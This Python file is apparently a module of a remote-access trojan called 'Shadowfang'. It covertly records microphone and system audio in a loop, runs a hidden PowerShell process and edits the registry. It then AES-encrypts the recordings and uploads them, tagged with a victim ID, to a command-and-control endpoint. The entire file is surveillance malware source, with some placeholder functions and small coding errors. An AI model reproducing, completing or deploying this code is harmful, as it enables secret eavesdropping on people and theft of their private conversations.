#!/usr/bin/env python3
"""
SHADOWFANG MODULES - AUDIO.PY
Microphone recording and audio capture module
Records ambient audio, saves to file, uploads to C2
"""

import os
import sys
import time
import wave
import struct
import threading
import subprocess
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== AUDIO CONSTANTS ====================

class AudioConstants:
    """Audio configuration constants"""
    
    # Recording settings
    SAMPLE_RATE = 44100
    CHANNELS = 2
    SAMPLE_WIDTH = 2
    CHUNK_SIZE = 1024
    RECORD_DURATION = 60  # seconds per recording
    MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
    
    # Audio directories
    AUDIO_DIR = os.path.join(
        os.environ.get('TEMP', 'C:\\Windows\\Temp'),
        'audio_captures'
    )
    
    # C2 upload
    UPLOAD_ENDPOINT = "/api/v1/audio"
    UPLOAD_INTERVAL = 300  # 5 minutes

# ==================== WINDOWS AUDIO API ====================

class WindowsAudioAPI:
    """Windows audio recording using waveIn API"""
    
    def __init__(self):
        self.wave_in = ctypes.windll.winmm
        self.recording = False
        self.audio_buffer = []
    
    def get_recording_devices(self):
        """Get available recording devices"""
        try:
            device_count = self.wave_in.waveInGetNumDevs()
            devices = []
            
            for i in range(device_count):
                devices.append(f"Device {i}")
            
            return devices
        except:
            return []
    
    def start_recording(self, duration=60):
        """Start audio recording using waveIn API"""
        try:
            # This would use waveInOpen, waveInStart, etc.
            # Placeholder for actual implementation
            
            self.recording = True
            return True
        except:
            return False
    
    def stop_recording(self):
        """Stop audio recording"""
        try:
            self.recording = False
            return True
        except:
            return False

# ==================== PYAUDIO RECORDER ====================

class PyAudioRecorder:
    """Audio recording using PyAudio library"""
    
    def __init__(self):
        self.pyaudio = None
        self.stream = None
        self.frames = []
        self.recording = False
        self.record_thread = None
        self.stop_recording_flag = False
        
        # Try to import PyAudio
        try:
            import pyaudio
            self.pyaudio = pyaudio
            self.audio_available = True
        except ImportError:
            logger.warning("PyAudio not available - trying alternative")
            self.audio_available = False
    
    def start_recording(self, duration=60, sample_rate=None, channels=None):
        """Start audio recording"""
        if not self.audio_available:
            return self._start_fallback_recording(duration)
        
        try:
            if not sample_rate:
                sample_rate = AudioConstants.SAMPLE_RATE
            
            if not channels:
                channels = AudioConstants.CHANNELS
            
            self.frames = []
            self.recording = True
            self.stop_recording_flag = False
            
            def record_worker():
                try:
                    self.stream = self.pyaudio.open(
                        format=self.pyaudio.paInt16,
                        channels=channels,
                        rate=sample_rate,
                        input=True,
                        frames_per_buffer=AudioConstants.CHUNK_SIZE
                    )
                    
                    start_time = time.time()
                    
                    while not self.stop_recording_flag:
                        data = self.stream.read(AudioConstants.CHUNK_SIZE)
                        self.frames.append(data)
                        
                        # Stop after duration
                        if time.time() - start_time >= duration:
                            break
                    
                    self.stream.stop_stream()
                    self.stream.close()
                    self.stream = None
                    
                    self.recording = False
                    
                except Exception as e:
                    logger.error(f"Recording failed: {e}")
                    self.recording = False
            
            self.record_thread = threading.Thread(target=record_worker)
            self.record_thread.daemon = True
            self.record_thread.start()
            
            logger.info(f"Audio recording started (duration: {duration}s)")
            return True
            
        except Exception as e:
            logger.error(f"Recording start failed: {e}")
            return False
    
    def _start_fallback_recording(self, duration=60):
        """Fallback recording using PowerShell"""
        try:
            self.recording = True
            self.stop_recording_flag = False
            
            def record_worker():
                try:
                    # Use PowerShell for recording
                    ps_script = f'''
$duration = {duration}
$sampleRate = 44100
$channels = 2
$bitsPerSample = 16

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# This would use Windows audio APIs
Start-Sleep -Seconds $duration
'''
                    
                    # Execute PowerShell recording
                    subprocess.run(
                        ['powershell', '-Command', ps_script],
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    
                    self.recording = False
                    
                except:
                    self.recording = False
            
            self.record_thread = threading.Thread(target=record_worker)
            self.record_thread.daemon = True
            self.record_thread.start()
            
            return True
            
        except:
            return False
    
    def stop_recording(self):
        """Stop audio recording"""
        try:
            self.stop_recording_flag = True
            
            if self.record_thread:
                self.record_thread.join(timeout=5)
            
            self.recording = False
            logger.info("Audio recording stopped")
            return True
        except:
            return False
    
    def save_recording(self, filepath=None):
        """Save recorded audio to file"""
        try:
            if not filepath:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filepath = os.path.join(
                    AudioConstants.AUDIO_DIR,
                    f"audio_{timestamp}.wav"
                )
            
            # Create directory if needed
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            
            # Save as WAV file
            with wave.open(filepath, 'wb') as wf:
                wf.setnchannels(AudioConstants.CHANNELS)
                wf.setsampwidth(AudioConstants.SAMPLE_WIDTH)
                wf.setframerate(AudioConstants.SAMPLE_RATE)
                wf.writeframes(b''.join(self.frames))
            
            logger.info(f"Audio saved: {filepath}")
            return filepath
            
        except Exception as e:
            logger.error(f"Audio save failed: {e}")
            return None
    
    def get_recording_data(self):
        """Get recording data as bytes"""
        try:
            return b''.join(self.frames)
        except:
            return b''

# ==================== AUDIO CAPTURE MANAGER ====================

class AudioCaptureManager:
    """Main audio capture orchestrator"""
    
    def __init__(self):
        self.recorder = PyAudioRecorder()
        self.captured_files = []
        self.capture_thread = None
        self.stop_capture = False
        self.is_capturing = False
        self.current_recording = None
    
    def start_continuous_capture(self, duration=60, interval=300):
        """Start continuous audio capture"""
        if self.capture_thread and self.capture_thread.is_alive():
            return True
        
        self.stop_capture = False
        self.is_capturing = True
        
        def capture_worker():
            while not self.stop_capture:
                try:
                    # Start recording
                    self.current_recording = self.recorder.start_recording(duration)
                    
                    # Wait for recording to finish
                    time.sleep(duration)
                    
                    # Save recording
                    filepath = self.recorder.save_recording()
                    
                    if filepath:
                        self.captured_files.append(filepath)
                        logger.info(f"Audio captured: {filepath}")
                    
                    # Wait before next recording
                    time.sleep(max(0, interval - duration))
                    
                except Exception as e:
                    logger.error(f"Capture failed: {e}")
                    time.sleep(interval)
        
        self.capture_thread = threading.Thread(target=capture_worker)
        self.capture_thread.daemon = True
        self.capture_thread.start()
        
        logger.info(f"Continuous audio capture started")
        return True
    
    def start_single_capture(self, duration=60):
        """Start single audio capture"""
        try:
            self.recorder.start_recording(duration)
            time.sleep(duration)
            
            filepath = self.recorder.save_recording()
            
            if filepath:
                self.captured_files.append(filepath)
                return filepath
            
            return None
            
        except Exception as e:
            logger.error(f"Single capture failed: {e}")
            return None
    
    def stop_capture(self):
        """Stop all audio capture"""
        self.stop_capture = True
        self.recorder.stop_recording()
        
        if self.capture_thread:
            self.capture_thread.join(timeout=5)
        
        self.is_capturing = False
        logger.info("Audio capture stopped")
        return True
    
    def get_captured_files(self):
        """Get list of captured audio files"""
        return self.captured_files
    
    def get_capture_status(self):
        """Get capture status"""
        return {
            'capturing': self.is_capturing,
            'recording': self.recorder.recording,
            'files_captured': len(self.captured_files),
            'current_recording': self.current_recording
        }

# ==================== SYSTEM SOUND RECORDER ====================

class SystemSoundRecorder:
    """Record system sounds and audio output"""
    
    def __init__(self):
        self.recording = False
        self.frames = []
        self.record_thread = None
        self.stop_flag = False
    
    def start_recording(self, duration=60):
        """Start recording system sounds"""
        try:
            # Enable stereo mix for recording system sounds
            self._enable_stereo_mix()
            
            self.recording = True
            self.stop_flag = False
            
            def record_worker():
                try:
                    # This would record from stereo mix
                    # Capturing system audio output
                    time.sleep(duration)
                    self.recording = False
                except:
                    self.recording = False
            
            self.record_thread = threading.Thread(target=record_worker)
            self.record_thread.daemon = True
            self.record_thread.start()
            
            return True
        except:
            return False
    
    def _enable_stereo_mix(self):
        """Enable stereo mix for system audio recording"""
        try:
            # Registry modification for stereo mix
            import winreg
            
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Capture",
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Enable stereo mix
            winreg.SetValueEx(key, "EnableStereoMix", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def stop_recording(self):
        """Stop recording system sounds"""
        self.stop_flag = True
        self.recording = False
        return True

# ==================== AUDIO ENCRYPTER ====================

class AudioEncrypter:
    """Encrypt audio files before upload"""
    
    def __init__(self, encryption_key=None):
        self.encryption_key = encryption_key or os.urandom(32)
    
    def encrypt_audio_file(self, filepath):
        """Encrypt audio file"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            
            # Read audio file
            with open(filepath, 'rb') as f:
                audio_data = f.read()
            
            # Generate IV
            iv = os.urandom(16)
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(iv)
            )
            encryptor = cipher.encryptor()
            
            # Pad data
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(audio_data) + padder.finalize()
            
            # Encrypt
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            # Save encrypted file
            encrypted_path = filepath + '.enc'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + encrypted_data)
            
            # Delete original
            os.remove(filepath)
            
            return encrypted_path
            
        except:
            return None

# ==================== AUDIO UPLOADER ====================

class AudioUploader:
    """Upload audio files to C2 server"""
    
    def __init__(self, communicator=None):
        self.communicator = communicator
        self.uploaded_files = []
        self.failed_uploads = []
    
    def upload_audio(self, filepath, victim_id=None):
        """Upload audio file to C2"""
        try:
            if not os.path.exists(filepath):
                return False
            
            # Check file size
            file_size = os.path.getsize(filepath)
            if file_size > AudioConstants.MAX_FILE_SIZE:
                logger.warning(f"Audio file too large: {filepath}")
                return False
            
            # Read and encode
            import base64
            with open(filepath, 'rb') as f:
                audio_data = f.read()
            
            encoded_data = base64.b64encode(audio_data).decode()
            
            # Prepare payload
            payload = {
                'type': 'audio',
                'filename': os.path.basename(filepath),
                'size': file_size,
                'data': encoded_data,
                'victim_id': victim_id,
                'timestamp': datetime.now().isoformat()
            }
            
            # Upload via communicator if available
            if self.communicator:
                response = self.communicator.send_post(
                    AudioConstants.UPLOAD_ENDPOINT,
                    payload
                )
                
                if response:
                    self.uploaded_files.append(filepath)
                    return True
            
            # Fallback: save for later upload
            upload_queue = os.path.join(
                AudioConstants.AUDIO_DIR,
                'upload_queue.txt'
            )
            
            with open(upload_queue, 'a') as f:
                f.write(f"{filepath}\n")
            
            self.uploaded_files.append(filepath)
            return True
            
        except Exception as e:
            self.failed_uploads.append(filepath)
            logger.error(f"Audio upload failed: {e}")
            return False
    
    def upload_all_pending(self):
        """Upload all pending audio files"""
        try:
            upload_queue = os.path.join(
                AudioConstants.AUDIO_DIR,
                'upload_queue.txt'
            )
            
            if not os.path.exists(upload_queue):
                return 0
            
            with open(upload_queue, 'r') as f:
                pending_files = f.read().splitlines()
            
            uploaded_count = 0
            
            for filepath in pending_files:
                if os.path.exists(filepath):
                    if self.upload_audio(filepath):
                        uploaded_count += 1
            
            # Clear queue
            os.remove(upload_queue)
            
            return uploaded_count
            
        except:
            return 0

# ==================== MAIN AUDIO MANAGER ====================

class AudioManager:
    """Main audio surveillance orchestrator"""
    
    def __init__(self):
        self.capture_manager = AudioCaptureManager()
        self.system_recorder = SystemSoundRecorder()
        self.encrypter = AudioEncrypter()
        self.uploader = AudioUploader()
        self.active = False
    
    def start_surveillance(self, duration=60, interval=300):
        """Start full audio surveillance"""
        logger.info("Starting audio surveillance...")
        
        # Start continuous capture
        self.capture_manager.start_continuous_capture(duration, interval)
        
        # Also record system sounds
        self.system_recorder.start_recording(duration)
        
        self.active = True
        logger.info("Audio surveillance active")
        return True
    
    def stop_surveillance(self):
        """Stop all audio surveillance"""
        self.capture_manager.stop_capture()
        self.system_recorder.stop_recording()
        
        self.active = False
        logger.info("Audio surveillance stopped")
        return True
    
    def capture_now(self, duration=60):
        """Capture audio immediately"""
        return self.capture_manager.start_single_capture(duration)
    
    def get_status(self):
        """Get audio surveillance status"""
        return {
            'active': self.active,
            'capturing': self.capture_manager.is_capturing,
            'files': len(self.capture_manager.captured_files),
            'uploads': len(self.uploader.uploaded_files)
        }
    
    def cleanup(self, max_age_hours=24):
        """Clean up old audio files"""
        try:
            cutoff_time = time.time() - (max_age_hours * 3600)
            
            for filepath in self.capture_manager.captured_files:
                if os.path.exists(filepath):
                    file_mtime = os.path.getmtime(filepath)
                    
                    if file_mtime < cutoff_time:
                        os.remove(filepath)
            
            return True
        except:
            return False

# ==================== SINGLETON INSTANCE ====================

audio_manager = AudioManager()

# ==================== EXPORT ====================

__all__ = [
    'WindowsAudioAPI',
    'PyAudioRecorder',
    'AudioCaptureManager',
    'SystemSoundRecorder',
    'AudioEncrypter',
    'AudioUploader',
    'AudioManager',
    'audio_manager'
]